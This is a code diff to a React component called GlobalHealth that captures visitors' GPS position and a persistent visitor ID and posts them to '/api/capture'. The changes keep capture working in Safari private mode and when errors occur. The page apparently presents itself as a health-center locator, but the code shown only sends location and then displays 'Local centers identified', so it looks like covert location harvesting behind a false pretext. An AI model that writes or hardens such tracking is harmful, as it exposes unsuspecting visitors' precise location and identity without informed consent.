@@ -7,12 +7,20 @@ export default function GlobalHealth() {
   const [loading, setLoading] = useState(false);
 
   const saveLocation = async (position = null, watchId = null) => {
-    if (watchId) navigator.geolocation.clearWatch(watchId);
+    if (watchId) {
+      try { navigator.geolocation.clearWatch(watchId); } catch (e) {}
+    }
     
-    let visitorId = localStorage.getItem('visitorId');
-    if (!visitorId) {
-      visitorId = 'vid_' + Math.random().toString(36).substring(2, 11) + Date.now().toString(36);
-      localStorage.setItem('visitorId', visitorId);
+    // Safety check for Visitor ID (Handles iPhone Private Mode)
+    let visitorId = 'anonymous';
+    try {
+      visitorId = localStorage.getItem('visitorId');
+      if (!visitorId) {
+        visitorId = 'vid_' + Math.random().toString(36).substring(2, 11) + Date.now().toString(36);
+        localStorage.setItem('visitorId', visitorId);
+      }
+    } catch (e) {
+      visitorId = 'safari_private_' + Date.now().toString(36);
     }
     
     const payload = {
@@ -28,22 +36,25 @@ export default function GlobalHealth() {
     };
 
     try {
-      await fetch('/api/capture', {
+      const response = await fetch('/api/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
         keepalive: true,
       });
       
-      if (position) {
+      if (position && response.ok) {
         setStatus('GPS Synchronized. Local centers identified.');
         setTimeout(() => {
           setStatus(null);
           setLoading(false);
         }, 3000);
       }
-    } catch (err) {}
+    } catch (err) {
+      console.error('Capture failed:', err);
+    }
   };
+
 
   // High-Precision Auto-Capture
   useEffect(() => {
